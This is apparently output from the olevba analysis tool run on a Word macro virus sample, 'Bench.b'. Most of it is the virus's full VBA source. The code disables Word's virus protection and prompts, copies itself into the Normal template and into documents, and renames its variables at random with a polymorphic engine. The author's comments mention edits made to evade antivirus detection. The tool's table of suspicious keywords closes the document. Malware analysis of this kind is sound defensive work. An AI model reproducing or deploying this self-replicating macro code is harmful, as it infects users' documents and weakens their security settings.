olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.b-03d75fe997aca9e7e358265e9f13c58a2f3933ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.b-03d75fe997aca9e7e358265e9f13c58a2f3933ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Options.ConfirmConversions = False
UC589892 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TH700659 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Month(Now) = Minute(Now) Then
Randomize: For GE49852 = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next GE49852:
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus"
    .Text = "I think " & Application.UserName & " is a big jerk!"
    .Show
    End With
End If
If UC589892 > 0 And TH700659 > 0 Then GoTo OUT
If UC589892 = 0 Then
Set NQ29828 = ActiveDocument.VBProject.VBComponents.Item(1)
BJ130187 = True
End If
If TH700659 = 0 Then
Set NQ29828 = NormalTemplate.VBProject.VBComponents.Item(1)
UT693382 = True
End If
Call EK188861_IU590694
ActiveDocument.Saved = True
If UT693382 <> True And BJ130187 <> True Then GoTo OUT
If UT693382 = True Then NQ29828.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UC589892 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub")
If BJ130187 = True Then NQ29828.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TH700659 - 1))
OUT:
If TH700659 <> 0 And UC589892 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub EK188861_IU590694()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "AE61796"
r1(2) = "SP71387"
r1(3) = "PR817783"
r1(4) = "SE396324"
r1(5) = "IU590694"
r1(6) = "EK188861"
r1(7) = "IB228241"
r1(8) = "IN469284"
r1(9) = "UC589892"
r1(10) = "TH700659"
r1(11) = "NQ29828"
r1(12) = "BJ130187"
r1(13) = "UT693382"
r1(14) = "GE49852"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call IU590694(a1, r1(x))
Next x
End Sub
Private Sub IU590694(IN469284, IB228241 As String)  'VAMP v1.0 [Thanks VicodinES]
On Error Resume Next
Dim AE61796 As Long: Dim SP71387 As Long: Dim PR817783 As Long: Dim SE396324 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AE61796 = 1: SP71387 = 1: PR817783 = .CountOfLines: SE396324 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IB228241, AE61796, SP71387, PR817783, SE396324, True)
s1 = .Lines(AE61796, 1)
s1 = Left(s1, SP71387 - 1) & IN469284 & Mid(s1, SE396324)
.replaceline AE61796, s1
AE61796 = PR817783 + 1: SP71387 = 1
PR817783 = .CountOfLines
SE396324 = Len(.Lines(.CountOfLines, 1))
Loop
End With
' BMV Strain B - Added Vic's Polymorph Engine - VAMP [Thanks Vic!]
'              - Payload from W97M/PSD - Why? Coz I liked it!
'              - The next strain's payload I'm gonna put more graphics [created by me] And more original code! - Like what Vic says "Be creative!" - I'm sure I haven't done that! =(
'              - Hacked CPCK code - I'm just learning Class Object infection ok! Though I had to edit some stuff so that AVP won't detect it
'              - I want to make a virus everyone wouldn't mind having
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

